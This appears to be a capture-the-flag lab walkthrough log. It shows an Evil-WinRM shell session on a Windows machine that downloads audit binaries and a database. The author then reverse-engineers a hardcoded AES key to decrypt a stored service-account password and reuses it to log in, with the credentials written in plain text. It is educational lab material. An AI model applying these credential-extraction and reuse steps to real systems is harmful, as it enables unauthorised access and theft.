*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ..
*Evil-WinRM* PS C:\Users\s.smith> ls


    Directory: C:\Users\s.smith


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/25/2020  11:17 AM                Desktop
d-r---        1/13/2020   3:36 AM                Documents
d-r---        7/14/2009   3:34 AM                Downloads
d-r---        7/14/2009   3:34 AM                Favorites
d-r---        7/14/2009   3:34 AM                Links
d-r---        7/14/2009   3:34 AM                Music
d-r---        7/14/2009   3:34 AM                Pictures
d-----        7/14/2009   3:34 AM                Saved Games
d-r---        7/14/2009   3:34 AM                Videos


*Evil-WinRM* PS C:\Users\s.smith> cd Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> ls


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/9/2020   4:27 AM             34 user.txt
-a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk


*Evil-WinRM* PS C:\Users\s.smith\Desktop> cat user.txt
********************************
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd /
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/9/2020   8:14 PM                inetpub
d-----        7/14/2009   4:20 AM                PerfLogs
d-r---        1/28/2020   7:27 PM                Program Files
d-r---        3/25/2020  11:30 AM                Program Files (x86)
d-----        1/15/2020   9:38 PM                Shares
d-r---        1/28/2020  11:37 PM                Users
d-----        3/25/2020  11:29 AM                Windows


*Evil-WinRM* PS C:\> cd Shares
*Evil-WinRM* PS C:\Shares> dir
*Evil-WinRM* PS C:\Shares> cd Audit
*Evil-WinRM* PS C:\Shares\Audit> dir


    Directory: C:\Shares\Audit


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/28/2020   9:40 PM                DB
d-----        1/26/2020  10:25 PM                x64
d-----        1/26/2020  10:25 PM                x86
-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
-a----        1/28/2020  11:29 PM             45 RunAudit.bat
-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll


*Evil-WinRM* PS C:\Shares\Audit> download CascAudit.exe
Info: Downloading C:\Shares\Audit\CascAudit.exe to CascAudit.exe

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Shares\Audit> download CascCrypto.dll
Info: Downloading C:\Shares\Audit\CascCrypto.dll to CascCrypto.dll                                                                                                                                                   

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Shares\Audit> cd DB
*Evil-WinRM* PS C:\Shares\Audit\DB> dir


    Directory: C:\Shares\Audit\DB


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/28/2020   9:39 PM          24576 Audit.db


*Evil-WinRM* PS C:\Shares\Audit\DB> download Audit.db
Info: Downloading C:\Shares\Audit\DB\Audit.db to Audit.db

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Shares\Audit\DB> exit

Info: Exiting with code 0
.
.
.
// open Audit.db with sqlite database browser
// found an encrypted password:
// BQO5l5Kj9MdErXx6Q6AGOw==
// used dnSpy to reverse engineer the .exe and .dll
// During this, found:
// in CascCrypto.dll, "1tdyjCbY1Ix49842"
// in CascAudit.exe, "c4scadek3y654321"
// tried to decrypt the AES encrypted password @ https://www.devglan.com/online-tools/aes-encryption-decryption
// CBC mode
// In Enter IV Used During Encryption(Optional) field: 1tdyjCbY1Ix49842
// c4scadek3y654321 as secret key
// Decoded -> Base64 -> w3lc0meFr31nd
// arksvc:w3lc0meFr31nd
.
.
.
allenwest1@debian:~/Desktop$ evil-winrm -u arksvc -p w3lc0meFr31nd -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> 
.
.
.
// Continued in asArksvc
.
.
.
